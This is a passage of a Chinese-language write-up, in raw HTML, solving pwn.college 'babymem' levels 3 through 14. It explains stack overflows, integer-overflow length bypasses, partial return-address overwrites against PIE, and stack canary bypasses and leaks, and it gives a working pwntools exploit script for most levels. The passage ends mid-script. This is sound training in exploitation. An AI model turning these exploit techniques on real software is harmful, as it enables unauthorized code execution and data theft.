class="hljs-string">b&quot;123&quot;</span><span class="hljs-comment">#这个是自己payload的输入长度</span><br>r.send(payload_size)<br>r.send(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">65</span>+p64(<span class="hljs-number">0x06e85456</span>))<span class="hljs-comment">#前面65个是填充，不过按理来说64个应该可以的，但是不知道为什么需要65个，怀疑是第一个&quot;A&quot;用于换行而被吞了。之后使用sendline就没有这个问题 </span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-3-2"><a class="markdownIt-Anchor" href="#level-3-2"></a> level 3</h2><blockquote><p>覆盖返回地址</p></blockquote><p>​主要看存储 read 数据的变量在栈中给的位置，<code>__int64 v9[12]; // [rsp+30h] [rbp-80h] BYREF</code> 这里就是看距离rbp的距离，也就是80h(栈是从高地址向低地址扩展，最后要覆盖rbp前面的返回地址)，然后再加上 <code>push rbp</code> 的8字节和吞了的1字节即可。</p><h2 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2"></a> level 4</h2><blockquote><p>依旧覆盖返回地址，但是限制了输入长度，需要整数溢出</p></blockquote><p>​这里限制了 nbytes &lt;= 0x45，但是可以用 <code>-1</code> 进行绕过，因为它使用的是 <code>jle</code> 这个比较的是有符号数据。<code>jbe</code> 才是无符号数据的小于跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x40272f &lt;challenge+779&gt;:    cmp    eax,0x45 # 这里eax被赋值为0xffffffff，它有符号数据为-1<br>0x402732 &lt;challenge+782&gt;:    jle    0x40274a &lt;challenge+806&gt; #-1小于0x45，这里会直接跳转，成功绕过长度限制<br></code></pre></td></tr></table></figure><p>​同时注意这里 read 读取的 buf 是从 nbytes + 4 开始的，也就是从 <code>[rbp - 64h + 4]</code> 开始( + 远离 rbp)。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402151534213.png" alt="image-20240215153443126" /></p><h2 id="level-5-2"><a class="markdownIt-Anchor" href="#level-5-2"></a> level 5</h2><blockquote><p>依旧是整数溢出问题，一开始理解的就有问题(被常见的-1回绕影响了判断)，最后直接构造就可以了</p></blockquote><p>​主要问题就是下面的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">  unsigned int v8; // [rsp+28h] [rbp-48h] BYREF<br>  unsigned int v9; // [rsp+2Ch] [rbp-44h] BYREF#这里是两个输入的数值，可以发现都为为32位<br><br>.text:00000000004028BA mov     edx, [rbp+var_48]<br>.text:00000000004028BD mov     eax, [rbp+var_44]<br>.text:00000000004028C0 imul    eax, edx<br>.text:00000000004028C3 cmp     eax, 7<br>.text:00000000004028C6 jbe     short loc_4028E7# 这里的乘积不能大于7<br><br>.text:00000000004028E7 mov     eax, [rbp+var_44]<br>.text:00000000004028EA mov     eax, eax<br>.text:00000000004028EC mov     [rbp+nbytes], rax<br>.text:00000000004028F0 mov     eax, [rbp+var_48]<br>.text:00000000004028F3 mov     edx, eax<br>.text:00000000004028F5 mov     rax, [rbp+nbytes]<br>.text:00000000004028F9 imul    rax, rdx<br>.text:00000000004028FD mov     [rbp+nbytes], rax<br>.text:0000000000402901 mov     rax, [rbp+nbytes]# 这里是获得可以输入的长度<br><br>.text:0000000000402A4D call    _read# 上面的 nbytes 如果大于0x7fffffff ffffffff，那么后面的eax就会被赋值为0xffffffff ffffffff而报错<br>.text:0000000000402A52 mov     [rbp+var_14], eax<br>.text:0000000000402A55 cmp     [rbp+var_14], 0<br>.text:0000000000402A59 jns     short loc_402A87# 这里read的返回值大小被限制，不能超过0x80000000<br></code></pre></td></tr></table></figure><p>​这里一直出现 <code>Bad Address</code> 的问题，这时因为 nbytes 不能超过<code>0x7fffffff ffffffff</code>。所以现在可以得到结果，这里需要两个32位数据相乘低32位小于7，然后64位乘积不大于SSIZE_MAX。简单而言，需要低32位小于7，然后高32位在0x1~0x7fffffff之间。一开始还想着-1什么的来搞，但是回绕太大卡住了，后面又认为这个数据要一个一个试，要爆破很久，所以一直卡住。后来突然意识到可以字节构造(利用溢出特性)，直接用<code>0x1 0000 0002</code>来作为乘积的结果，然后就能得到两个乘数 <code>0x8000 0001</code> 和 <code>0x2</code> ，然后就可以过了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>,<span class="hljs-string">b&#x27;2147483649&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<span class="hljs-comment"># 相乘可以满足条件</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0X402471</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-7-2"><a class="markdownIt-Anchor" href="#level-7-2"></a> level 7</h2><blockquote><p>开启了 PIE 保护</p></blockquote><p>​由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的，它们不会受到随机化的影响。因此通过覆盖EIP(这里是返回地址的地方)的后<strong>8到16位</strong>(按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x60</span><span class="hljs-comment"># 直接是[rbp-nh]中的n</span><br>table = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-number">0x10</span>):<br>    table.append(i)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># 通过不断循环来爆破</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>))<span class="hljs-comment">#这里加上了 push rbp</span><br>    payload = interval * <span class="hljs-string">b&#x27;A&#x27;</span> + p8(<span class="hljs-number">0xe5</span>) + p8(random.choice(table) + <span class="hljs-number">0x9</span>) <span class="hljs-comment">#这里注意需要绕过长度检测，不是从函数一开始跳转的</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="level-8-2"><a class="markdownIt-Anchor" href="#level-8-2"></a> level 8</h2><blockquote><p>增加对于payload的长度检测，它通过read读取payload，然后strlen()来计算，由于strlen()通过’\x00’来计算长度，所以可以在payload最开始加上 ‘\x00’ 来绕过strlen()的长度检测</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x60</span><br>table = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-number">0x10</span>):<br>    table.append(i)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>))<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + (interval - <span class="hljs-number">1</span>) * <span class="hljs-string">b&#x27;A&#x27;</span> + p8(<span class="hljs-number">0xb7</span>) + p8(random.choice(table) + <span class="hljs-number">0x5</span>)<br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="level-9-2"><a class="markdownIt-Anchor" href="#level-9-2"></a> level 9</h2><blockquote><p>开启了 Canary和PIE，需要绕过这两个</p></blockquote><p>​对于 canary，它是从内存中某处(一般为fs:0x28–x64的)复制一个随机数canary，该随机数会在创建栈帧时紧跟着 <strong>rbp</strong> 入栈。如下图所示 <a href="https://zhuanlan.zhihu.com/p/613650807">参考: CTFer成长日记13：Canary的基本原理与绕过 - 知乎 (zhihu.com)</a></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402171204504.png" alt="image-20240217120423364" /></p><p>​这里绕过cannary的方式就是使用一个存储字节 n 来进行绕过。程序通过一个字节读来实现数据的读取，但如果这里覆盖了 n 的值，修改为指向返回地址，那么这里读取的数据将直接覆盖到返回地址上，实现了对于 cannary 的绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (n &lt; size) <br>&#123;<br>    n += read(<span class="hljs-number">0</span>, input + n, <span class="hljs-number">1</span>);    <br>&#125;<br></code></pre></td></tr></table></figure><p>​根据ida中信息分析，input的位置在 <code>[rbp-40h]</code> ，而 n 的位置在 <code>[rbp-18h]</code> 中间相差40bytes，所以之后需要填补这些数据后覆盖n，之后就是正常的绕过 PIE 操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">__int64 input[5]; // [rsp+40h] [rbp-40h] BYREF<br>int n; // [rsp+68h] [rbp-18h] BYREF<br><br>+---------------------------------+-------------------------+--------------------+--------+<br>|                  Stack location |            Data (bytes) |      Data (LE int) |name  |<br>+---------------------------------+-------------------------+--------------------+--------+<br>| 0x00007ffe8aa0b840 (rsp+0x0040) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 | input  |<br>| 0x00007ffe8aa0b848 (rsp+0x0048) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |  |<br>| 0x00007ffe8aa0b850 (rsp+0x0050) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b858 (rsp+0x0058) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b860 (rsp+0x0060) | 48 48 48 48 48 48 48 48 | 0x4848484848484848 |        |<br>| 0x00007ffe8aa0b868 (rsp+0x0068) | 4a 00 00 00 fe 7f 00 00 | 0x00007ffe0000004a |n(4byte)|<br>| 0x00007ffe8aa0b870 (rsp+0x0070) | 00 d2 59 e0 00 56 00 00 | 0x00005600e059d200 |        |<br>| 0x00007ffe8aa0b878 (rsp+0x0078) | 00 ec cc 6e 14 e6 e5 8b | 0x8be5e6146eccec00 | canary |<br>| 0x00007ffe8aa0b880 (rsp+0x0080) | c0 c8 a0 8a fe 7f 00 00 | 0x00007ffe8aa0c8c0 |push rbp|<br>| 0x00007ffe8aa0b888 (rsp+0x0088) | 11 22 59 e0 00 56 00 00 | 0x00005600e0592211 | return |<br>+---------------------------------+-------------------------+--------------------+--------+<br></code></pre></td></tr></table></figure><p>​这是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x40</span> <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval+<span class="hljs-number">8</span>+<span class="hljs-number">2</span>))<span class="hljs-comment"># 算上push rbp与返回地址的2个字节填充</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <span class="hljs-comment"># input与n之间的差值</span><br>        r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>        r.send(p8(<span class="hljs-number">0x48</span>)) <span class="hljs-comment"># input到return的距离，intercal+8</span><br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x47</span>))<span class="hljs-comment"># 这里是要跳转的，因为再下一次之前，它会读取一个字节并加1，所以覆盖n需要先距离-1</span><br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x2b</span>))<br>    r.recvuntil(<span class="hljs-string">&#x27;bytes away from the start of the input buffer.&#x27;</span>)<br>    r.send(p8(<span class="hljs-number">0x22</span>))<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>​9.1没有回显，需要删除 <code>r.recvuntil('bytes away from the start of the input buffer.')</code>。</p><h2 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> level 10</h2><blockquote><p>被别人的思路误导了，这里只需要注意字符串是以’\x00’截断，然后利用printf即可</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"># 主要就是下面的语句<br><span class="hljs-type">char</span> v13[<span class="hljs-number">320</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-150h] BYREF</span><br>v11 = v13;<br>buf = &amp;v13[<span class="hljs-number">0x43</span>];<span class="hljs-comment">// 这里就是首先读取flag到input的一个地方，然后再从头输入input</span><br>v3 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>read(v3, buf, <span class="hljs-number">0x100</span>uLL);<span class="hljs-comment">// 设置flag到栈中</span><br>v9 = read(<span class="hljs-number">0</span>, v11, nbytes);<span class="hljs-comment">// 读取输入</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)v11);<span class="hljs-comment">//主要利用printf打印，将v13中前0x43字符填充，防止&#x27;\x00&#x27;截断，然后打印会顺带把flag带出来</span><br></code></pre></td></tr></table></figure><p>​脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x43</span> <br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval <br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-11"><a class="markdownIt-Anchor" href="#level-11"></a> level 11</h2><blockquote><p>en……直接覆盖mmap到flag那一页就可以了，没有料到就这样发送大量数据就行</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x8000</span> <br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval <br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-12-2"><a class="markdownIt-Anchor" href="#level-12-2"></a> level 12</h2><blockquote><p>经典的 canary 的绕过方式，两次read，第一次通过printf来泄露，第二次获得flag</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span><span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>) <span class="hljs-comment"># 满足buffer的要求</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>    text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<span class="hljs-comment"># 获得canary的值</span><br>    log.info(<span class="hljs-built_in">list</span>(canary))<br>    <span class="hljs-comment"># 进入Backdoor后，即第二次</span><br>    interval = <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span> <span class="hljs-comment"># 增加覆盖rbp与return的后两个字节(PIE)</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (interval - <span class="hljs-number">18</span>) + canary +  <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8</span> + p8(<span class="hljs-number">0xCA</span>) + p8(<span class="hljs-number">0x18</span>) <span class="hljs-comment"># -18是后面添加的东西，中间是canary与rbp，最后是win_authed需要的</span><br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="level-13-2"><a class="markdownIt-Anchor" href="#level-13-2"></a> level 13</h2><blockquote><p>跟 level 10 类似，只需要把栈中flag以前的数据覆盖了即可。但是深层次的原因是上一个函数读取flag到栈中，然后栈上数据没有清理，导致后面的函数可以构造填充使用printf访问</p></blockquote><p>​主要就是栈中数据没有清除，这里分析两个函数调用的关键局部变量。它们之间的差值(0x1B8-0x110=0x99)就是需要填充的多余数据，然后printf会在打印输入中把flag也顺带出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD v2[<span class="hljs-number">34</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF# 这里是verify_flag中保存flag的数组</span><br><span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-1B8h]# 这里是input的数组</span><br></code></pre></td></tr></table></figure><p>​脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br>r = process(binary_paths)<br>interval = <span class="hljs-number">0x99</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * interval<br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-14-2"><a class="markdownIt-Anchor" href="#level-14-2"></a> level 14</h2><blockquote><p>与 level 12 类似，同时这里的printf对于输出长度存在限制，这个限制导致不能直接泄露出canary，但是level 12对buf进行了memset操作，而level 14没有，所以可以用之前没有置零的数据来找到程序的canary–&gt;这里感觉像是每个函数的canary都是一样的，所以可以这样使用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9][0-9].[0-9]&quot;</span>)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    interval = <span class="hljs-number">0x88</span> + <span class="hljs-number">1</span><span class="hljs-comment"># 不会算，直接gdb调试出来的，感觉不太对，但目前只能这样了</span><br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>) <br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, 